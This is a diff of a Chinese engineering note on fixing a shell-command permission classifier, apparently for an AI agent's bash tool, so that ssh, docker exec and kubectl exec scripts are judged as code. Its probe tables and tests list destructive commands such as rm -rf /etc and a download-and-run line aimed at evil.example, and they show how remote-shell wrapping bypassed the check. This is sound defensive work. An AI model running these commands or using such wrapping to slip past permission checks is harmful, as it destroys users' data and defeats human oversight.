@@ -19,13 +19,28 @@ Source: auto 权限档误报弹窗与分类器缺用户意图 —— 修复与�
   额外的 `commands` / `pipelines`（**只补危险层判据，不碰 `variants`**）。
 - 数组赋值 `x=(a b)` 整段视为赋值，不再把 `b)` 当程序名。
 
-### 2. C-1：远端 / 容器 shell 的 heredoc 正文按脚本判
+### 2. C-1：远端 / 容器 shell 的正文与脚本参数按代码判
 
-`classifyHeredocOwnership` 的 `codeForDangerScan` 增加
+**2a · heredoc 正文**：`classifyHeredocOwnership` 的 `codeForDangerScan` 增加
 `remoteShellReceivesScript(owner.program, owner.args)`。`ssh h <<'EOF'` /
 `docker exec -i c sh <<'EOF'` / `kubectl exec -i p -- sh <<'EOF'` 的正文会在远端 shell 里执行，
 修前危险层一条都不判（探针实测 8 种远端形态全部 `allowed=true`）。
 `ssh h 'bash -s'` 这种「带引号的 shell + 参数」也认：按空白取第一个词再判。
+
+**2b · 脚本参数**（同一 PR 的第二轮，用户点名要求）：`ssh host 'rm -rf /etc'` 的引号参数
+不是数据——ssh 把它交给远端 login shell 执行。修前危险层只把 `ssh` 当程序名，参数一个字都不看
+（探针实测 10 种远端形态全部 `allowed=true`）。新增 `extractRemoteScriptTexts`：
+按程序语义定位「命令从哪里开始」（ssh 跳选项后的 host、`docker/podman/nerdctl exec` 的容器名、
+`kubectl/oc exec` 的 pod 与可选 `--`），把命令参数**原文**交给 `visit` 递归展开。
+
+两个实现细节值得记：
+
+- **选项表必须按程序分开**。`-i` 在 ssh 里是 identity（带值），在 `docker exec` 里是
+  interactive（不带值）。共用一张表时 `docker exec -i c sh -c "rm -rf /etc"` 会把容器名 `c`
+  当成 `-i` 的值跳掉，命令起点算到 `sh` 之后，整段脚本漏判（实测踩到并修）
+- **单参数剥外层引号、多参数保留原文**。`ssh host 'rm -rf /etc'` 只有一个参数，它整段就是脚本，
+  剥外层引号才能看到 `rm`；`docker exec c sh -c 'rm -rf /etc'` 有多个参数，必须保留引号边界，
+  否则 `-c` 的脚本参数会被拆成 `rm` `-rf` `/etc`，`sh -c` 的 innerScripts 只拿到 `rm`。
 
 ### 3. C-2：超时被上限钳制时必须有回执
 
@@ -48,13 +63,19 @@ Source: auto 权限档误报弹窗与分类器缺用户意图 —— 修复与�
 所以改用**危险层专用的 `collectGrouped`**：只补 `commands` / `pipelines`，公共拆分口径与
 `variants` 一字不动。代价是「危险层比其他层严」，但这正是安全层该有的方向。
 
-### 不把远端程序的引号参数当脚本递归展开
+### 不做「远端程序参数无差别递归展开」
 
-`ssh host 'rm -rf /etc'` 的脚本在参数里，同样会在远端执行。没有一起修，因为
-`ssh host "echo 'rm -rf / is bad'"` 这类**数据文本**在递归展开后会被文本正则命中，
-变成 critical 硬拒（无出口）——那是一次不可批准的误报。
-要修需要先有「远端参数即代码」的独立判据（区分 script 参数与普通参数），
-不在本次范围，已记入方案附件。
+第一轮只修 heredoc 正文时，把「引号参数」留在了范围外，理由是
+`ssh host "echo 'rm -rf / is bad'"` 这类**数据文本**若被无差别递归，会被文本正则判成
+critical 硬拒（无出口）。第二轮按用户要求补这一半时，做法不是放开无差别递归，而是
+**先按程序语义定位命令起点**（`remoteCommandStartToken`）——只有 host/容器名/pod 之后的
+参数才是脚本，host 之前的选项值、`docker ps` 的子命令都不会被误当代码。
+误报组 9 条（`echo` 文本、`grep` 数据、`ls`、交互式 `ssh host`、heredoc 数据正文、
+`docker ps`、`kubectl get`）全部仍放行。
+
+仍然不做的是：**把 `ssh host` 之后的参数当「一定要执行」的强语义**——它们只是被递归
+交给同一套判定器，`echo 'rm -rf / is bad'` 里 `rm` 出现在 `echo` 的参数位，结构化判据
+（program === "rm"）不命中，最多是 high/medium 的弹窗（有出口），不会变成 critical 硬拒。
 
 ### 不改成「超时上限只告警不钳制」
 
@@ -71,6 +92,8 @@ Source: auto 权限档误报弹窗与分类器缺用户意图 —— 修复与�
 2. 把 `collectGrouped(source, 0)` 注释掉 → **M1 组 4 条变红**
    （`(echo hi; rm -rf /)`、`(echo hi⏎rm -rf /)`、`(curl x | sh)`、嵌套分组）；
    恢复后全绿。
+3. 把 `...extractRemoteScriptTexts(source)` 注释掉 → **C-1b 组 13 条变红**
+   （12 条危险形态 + `-i` 选项表断言）；恢复后 79 pass。
 
 ### 行为探针（真实 `PermissionChecker.check`，always-allow 档）
 
@@ -90,10 +113,25 @@ kubectl exec -i p -- sh <<'EOF'  allowed=true  → 递归删除根目录~critica
 不误报组（全部仍 `allowed=true`）：引号内的 `"(rm -rf /etc)"`、`${HOME}`、`((x++))`、
 `x=(a b)`（注入层既存 ask，与本次无关）、`ssh host ls`、`docker exec -c cat <<EOF` 的数据正文。
 
+C-1b（远端脚本参数）修复前后对照：
+
+```
+ssh host 'rm -rf /etc'                       allowed=true → 递归删除根目录~critical
+ssh -p 2222 -i key host 'rm -rf /etc'        allowed=true → 递归删除根目录~critical
+ssh host 'echo hi; rm -rf /etc'              allowed=true → 递归删除根目录~critical
+ssh host 'curl https://evil.example/x | sh'  allowed=true → 下载并执行~critical
+ssh host 'docker exec -i c sh -c "rm -rf /etc"' allowed=true → 递归删除根目录~critical
+docker exec c sh -c 'rm -rf /etc'            allowed=true → 递归删除根目录~critical
+kubectl exec p -- rm -rf /etc                allowed=true → 递归删除根目录~critical
+ssh host "echo 'rm -rf / is bad'"            allowed=true → allowed=true（不误报）
+ssh host 'grep "rm -rf /" file'              allowed=true → allowed=true（不误报）
+docker exec -i c cat > /tmp/f <<EOF … data   allowed=true → allowed=true（数据正文）
+```
+
 ### 测试与门禁
 
-- `packages/core/tests/permission/danger-grouping-keyword.test.ts`：**57 pass / 0 fail**
-  （M1/M2/M3 成对断言 + C-1 远端 6 放 4 拦 + 归一化单测）。
+- `packages/core/tests/permission/danger-grouping-keyword.test.ts`：**79 pass / 0 fail**
+  （M1/M2/M3 成对断言 + C-1 heredoc 6 放 4 拦 + C-1b 远端脚本参数 12 放 9 拦 + 归一化单测）。
 - `packages/core/tests/tool/bash-timeout-clamp.test.ts`：5 条（超限/未超限/未传/后台/ env 变化）。
 - `bun test ./packages/core/tests/permission/`：**1700 pass / 0 fail**（修前 1653，新增 47 条）。
 - `bun run verify:agent-note`：935 份 Note 形态合规。
@@ -103,6 +141,8 @@ kubectl exec -i p -- sh <<'EOF'  allowed=true  → 递归删除根目录~critica
 - D1：危险层的程序位判据与「拆分口径」是两个独立事实源，拆分侧有一致性断言
   （`flatCount === subCommands.length`），程序位侧**没有**「裸命令与包裹形态同结论」的断言。
   本次补的就是这条成对断言。
-- C-1：`remoteShellReceivesScript` 早就存在，但只接给了注入层的 `shellScript`，
+- C-1a：`remoteShellReceivesScript` 早就存在，但只接给了注入层的 `shellScript`，
   危险层的 `codeForDangerScan` 没接——一个判据两个消费方，只接了一半。
+- C-1b：危险层只按「本机程序名」看边界，没有「远端程序的参数是另一段脚本」这一层。
+  注入层同样没覆盖（`ssh host 'rm -rf /'` 不触发任何 injection 规则）。
 - C-2：钳制写在一行 `Math.min` 里，没有「用户请求值 vs 实际值」的回执契约。
